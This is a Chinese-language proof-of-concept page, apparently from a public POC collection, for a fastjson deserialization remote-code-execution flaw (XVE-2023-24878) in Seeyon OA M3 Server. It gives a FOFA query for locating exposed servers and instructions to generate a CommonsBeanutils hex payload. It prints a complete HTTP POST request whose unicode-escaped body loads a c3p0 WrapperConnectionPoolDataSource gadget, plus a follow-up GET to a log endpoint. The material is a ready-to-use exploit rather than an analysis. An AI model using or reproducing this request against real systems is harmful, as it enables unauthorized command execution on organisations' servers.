
## 致远OA M3 Server 反序列化漏洞
致远 M3 反序列化 远程命令执行漏洞（XVE-2023-24878）

漏洞信息：
https://x.threatbook.com/v5/vul/6bf25402a41b4fc27497a5b42a8421d7ef38d57cb7d8143dedb9a6f438310a2d9e083c39c56fee2571651827b4d9ce8d



## fofa
```
"M3-Server 已启动"
```

根据群友说，这个漏洞是fastjson反序列化

利用 CB1 生成 hex 反序列化数据，替换 POC 中的 HEX

## poc
```
POST /mobile_portal/api/pns/message/send/batch/6_1sp1 HTTP/1.1
Host: User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: Hm_lvt_82116c626a8d504a5c0675073362ef6f=1666334057
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Content-Type: application/json
Content-Length: 3680

[{"userMessageId":"{\"@\u0074\u0079\u0070\u0065\":\"\u0063\u006f\u006d\u002e\u006d\u0063\u0068\u0061\u006e\u0067\u0065\u002e\u0076\u0032\u002e\u0063\u0033\u0070\u0030\u002e\u0057\u0072\u0061\u0070\u0070\u0065\u0072\u0043\u006f\u006e\u006e\u0065\u0063\u0074\u0069\u006f\u006e\u0050\u006f\u006f\u006c\u0044\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\",\"\u0075\u0073\u0065\u0072\u004f\u0076\u0065\u0072\u0072\u0069\u0064\u0065\u0073\u0041\u0073\u0053\u0074\u0072\u0069\u006e\u0067\":\"\u0048\u0065\u0078\u0041\u0073\u0063\u0069\u0069\u0053\u0065\u0072\u0069\u0061\u006c\u0069\u007a\u0065\u0064\u004d\u0061\u0070:HEX;\"}|","channelId":"111","title":"111","content":"222","deviceType":"androidphone","serviceProvider":"baidu","deviceFirm":"other"}]
```
然后再 Get 访问/mobile_portal/api/systemLog/pns/loadLog/app.log

![ef21d114d1965815537db98570d2daf7](https://github.com/wy876/POC/assets/139549762/b3609c72-0516-4c69-a64f-62c86fffb30d)

## 漏洞分析
```
https://mp.weixin.qq.com/s/czbhaf7jpNmgjAt-OFWmIA
```
